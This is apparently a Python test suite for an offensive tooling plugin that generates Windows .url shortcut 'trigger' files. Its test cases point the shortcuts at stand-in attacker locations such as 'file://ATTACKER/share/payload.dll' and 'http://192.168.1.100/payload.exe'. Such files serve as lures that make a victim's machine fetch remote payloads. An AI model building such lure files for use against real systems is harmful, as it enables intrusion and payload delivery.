"""
Test suite for plugin_trigger_url.py
Tests Windows internet shortcut (.url) trigger file creation.
"""

import pathlib
import sys
import tempfile
import traceback

sys.path.insert(0, str(pathlib.Path(__file__).parent.parent))

# Ensure UTF-8 output on Windows consoles (CP1252 cannot encode ✓/✗)
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

from plugin_trigger_url import UrlTriggerPlugin

passed = 0
failed = 0


def report(name, ok, detail=""):
    global passed, failed
    if ok:
        passed += 1
        print(f"  ✓ {name}")
        if detail:
            print(f"    {detail}")
    else:
        failed += 1
        print(f"  ✗ {name}")
        if detail:
            print(f"    {detail}")


def main():
    print("\n=======================================================================")
    print("TEST SUITE: plugin_trigger_url.py")
    print("=======================================================================\n")

    with tempfile.TemporaryDirectory(prefix="erebus_url_test_") as temp_dir:
        temp_path = pathlib.Path(temp_dir)
        payload_dir = temp_path / "payload"
        payload_dir.mkdir()

        # [1] Plugin Instantiation
        print("\n[1] Testing Plugin Instantiation")
        print("-" * 70)
        try:
            plugin = UrlTriggerPlugin()
            report("UrlTriggerPlugin instantiates without error", True)
        except Exception as e:
            report("UrlTriggerPlugin instantiates without error", False, f"Exception: {e}")
            traceback.print_exc()
            print(f"\nRESULTS: {passed} passed, {failed} failed")
            return 1

        # [2] Basic URL Trigger Creation
        print("\n[2] Testing Basic URL Trigger Creation")
        print("-" * 70)
        TARGET_URL = "file://ATTACKER/share/payload.dll"
        try:
            result = plugin.create_url_trigger(
                target_url=TARGET_URL,
                output_filename="test.url",
                payload_dir=payload_dir,
            )
            report("create_url_trigger() returns a Path", isinstance(result, pathlib.Path),
                   f"Got: {type(result)}")
            report("Output file exists", result.exists(), f"Path: {result}")
            if result.exists():
                size = result.stat().st_size
                report("File size > 0", size > 0, f"Size: {size} bytes")
                content = result.read_text(encoding="utf-8")
                report("Content contains [InternetShortcut]", "[InternetShortcut]" in content)
                report("Content contains the target URL", TARGET_URL in content)
                report("Content contains GUID {000214A0-0000-0000-C000-000000000046}",
                       "{000214A0-0000-0000-C000-000000000046}" in content)
            else:
                report("File size > 0", False, "File does not exist")
                report("Content contains [InternetShortcut]", False, "File does not exist")
                report("Content contains the target URL", False, "File does not exist")
                report("Content contains GUID", False, "File does not exist")
        except Exception as e:
            report("create_url_trigger() basic", False, f"Exception: {e}")
            traceback.print_exc()

        # [3] WebDAV URL Mode
        print("\n[3] Testing WebDAV URL Mode")
        print("-" * 70)
        WEBDAV_URL = "http://192.168.1.100/payload.exe"
        try:
            result_webdav = plugin.create_url_trigger(
                target_url=WEBDAV_URL,
                output_filename="webdav.url",
                payload_dir=payload_dir,
            )
            report("WebDAV URL trigger created", result_webdav.exists())
            if result_webdav.exists():
                content = result_webdav.read_text(encoding="utf-8")
                report("WebDAV content contains URL", WEBDAV_URL in content)
        except Exception as e:
            report("WebDAV URL mode", False, f"Exception: {e}")
            traceback.print_exc()

        # [4] Working Directory Option
        print("\n[4] Testing Working Directory Option")
        print("-" * 70)
        try:
            result_wd = plugin.create_url_trigger(
                target_url="file://ATTACKER/share/lure.dll",
                output_filename="with_wd.url",
                payload_dir=payload_dir,
                working_directory=r"C:\Users\Public",
            )
            report("URL trigger with WorkingDirectory created", result_wd.exists())
            if result_wd.exists():
                content = result_wd.read_text(encoding="utf-8")
                report("WorkingDirectory field present in content",
                       "WorkingDirectory" in content)
        except Exception as e:
            report("WorkingDirectory option", False, f"Exception: {e}")
            traceback.print_exc()

        # [5] Plugin Registration
        print("\n[5] Testing Plugin Registration")
        print("-" * 70)
        try:
            registered = plugin.register()
            report("register() returns a dict", isinstance(registered, dict))
            report("register() contains 'create_url_trigger'",
                   "create_url_trigger" in registered)
        except Exception as e:
            report("Plugin registration", False, f"Exception: {e}")
            traceback.print_exc()

        # [6] Plugin Metadata and Validation
        print("\n[6] Testing Plugin Metadata and Validation")
        print("-" * 70)
        try:
            meta = plugin.get_metadata()
            report("get_metadata() returns metadata", meta is not None)
            valid, err = plugin.validate()
            report("validate() returns True", valid is True, f"Error: {err}")
        except Exception as e:
            report("Plugin metadata/validation", False, f"Exception: {e}")
            traceback.print_exc()

    print(f"\nRESULTS: {passed} passed, {failed} failed")
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:
        print(f"FATAL ERROR: {e}")
        traceback.print_exc()
        sys.exit(1)
